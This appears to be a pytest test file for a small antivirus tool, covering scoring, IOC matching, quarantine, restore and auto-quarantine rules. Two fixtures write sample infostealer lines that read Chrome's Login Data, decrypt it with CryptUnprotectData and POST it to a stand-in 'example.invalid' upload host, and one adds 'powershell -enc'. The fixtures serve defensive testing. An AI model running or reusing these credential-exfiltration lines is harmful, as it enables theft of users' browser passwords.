import hashlib
from pathlib import Path

from src.antivir.core import analyze_file, quarantine_file, restore_file


def test_analyze_file_reports_hash_and_suspicious_path(tmp_path):
    suspicious = tmp_path / "AppData" / "Roaming" / "WindowsHelper" / "svchost32.exe"
    suspicious.parent.mkdir(parents=True)
    suspicious.write_bytes(b"sample-not-executable")

    result = analyze_file(suspicious)

    assert result.sha256 == hashlib.sha256(b"sample-not-executable").hexdigest()
    assert result.score >= 50
    assert any("WindowsHelper" in reason or "svchost32" in reason for reason in result.reasons)


def test_quarantine_moves_file_and_records_verified_hash(tmp_path):
    source = tmp_path / "user" / "sample.exe"
    source.parent.mkdir()
    source.write_bytes(b"test payload")
    quarantine = tmp_path / "quarantine"

    item = quarantine_file(source, quarantine)

    assert not source.exists()
    assert item.path.exists()
    assert item.sha256 == hashlib.sha256(b"test payload").hexdigest()
    assert item.metadata.exists()


def test_restore_returns_file_and_removes_quarantine_entry(tmp_path):
    source = tmp_path / "user" / "sample.exe"
    source.parent.mkdir()
    source.write_bytes(b"test payload")
    quarantine = tmp_path / "quarantine"

    item = quarantine_file(source, quarantine)
    restored = restore_file(item.path, item.metadata, source)

    assert restored == source
    assert source.read_bytes() == b"test payload"
    assert not item.path.exists()
    assert not item.metadata.exists()


def test_quarantine_refuses_windows_and_program_files_paths(tmp_path):
    protected = Path("C:/Windows/System32/notepad.exe")
    try:
        quarantine_file(protected, tmp_path / "quarantine")
    except ValueError as exc:
        assert "protected" in str(exc).lower()
    else:
        raise AssertionError("protected path must be refused")


def test_exact_high_confidence_ioc_requires_both_known_name_and_known_path():
    from src.antivir.core import is_exact_ioc_file

    exact = Path(r"C:\Users\tester\AppData\Roaming\WindowsHelper\svchost32.exe")
    path_only = Path(r"C:\Users\tester\AppData\Roaming\WindowsHelper\ordinary.exe")
    name_only = Path(r"C:\Users\tester\Downloads\svchost32.exe")

    assert is_exact_ioc_file(exact) is True
    assert is_exact_ioc_file(path_only) is False
    assert is_exact_ioc_file(name_only) is False



def test_analyze_script_detects_browser_credentials_decryption_and_exfiltration(tmp_path):
    from src.antivir.core import analyze_file

    script = tmp_path / "suspicious.ps1"
    script.write_text(
        'sqlite3.connect("Chrome\\\\User Data\\\\Default\\\\Login Data")\n'
        'CryptUnprotectData($encryptedKey)\n'
        'Invoke-RestMethod -Uri "https://example.invalid/upload" -Method Post',
        encoding="utf-8",
    )

    result = analyze_file(script)

    assert result.score >= 80
    assert any("браузера" in reason.lower() for reason in result.reasons)
    assert any("отправки данных" in reason.lower() for reason in result.reasons)


def test_analyze_file_flags_known_infostealer_executable_name(tmp_path):
    sample = tmp_path / "vidar.exe"
    sample.write_bytes(b"not-a-real-pe-file")

    result = analyze_file(sample)

    assert result.score >= 50
    assert any("infostealer" in reason.lower() for reason in result.reasons)


def test_auto_quarantine_allows_only_high_confidence_user_script(tmp_path):
    from src.antivir.core import should_auto_quarantine

    script = tmp_path / "Downloads" / "invoice.vbs"
    script.parent.mkdir()
    script.write_text(
        'sqlite3.connect("Chrome\\\\User Data\\\\Default\\\\Login Data") '
        'CryptUnprotectData(key) zipfile.ZipFile(data) '
        'requests.post("https://example.invalid/upload") '
        'powershell -enc abc',
        encoding="utf-8",
    )
    result = analyze_file(script)

    assert result.score >= 90
    assert should_auto_quarantine(result) is True


def test_auto_quarantine_does_not_apply_to_low_confidence_or_executable_files(tmp_path):
    from src.antivir.core import ScanResult, should_auto_quarantine

    low = ScanResult(tmp_path / "Downloads" / "readme.ps1", "0" * 64, 75, ["weak signal"])
    executable = ScanResult(tmp_path / "Downloads" / "suspicious.exe", "0" * 64, 100, ["score"])
    assert should_auto_quarantine(low) is False
    assert should_auto_quarantine(executable) is False
